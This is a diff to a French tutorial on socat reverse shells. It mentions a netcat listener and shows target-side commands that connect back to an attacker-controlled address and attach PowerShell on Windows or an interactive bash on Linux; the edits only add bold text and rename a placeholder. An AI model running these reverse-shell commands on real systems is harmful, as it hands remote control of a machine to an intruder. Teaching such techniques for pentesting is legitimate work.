@@ -17,17 +17,18 @@ Cette commande est équivalente à faire **`nc -vnlp 1234`**.
 
 Sur la machine cible, on va effectuer la commande :
 
-1) Sur une machine windows
+1) Sur une machine **windows**
 
 ```shell
 PS C:\Users\user> socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 ```
 
-2) Sur une machine linux
+2) Sur une machine **linux**
 
 ```shell
-user@raspberrypi: ~$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
+
 
 
 
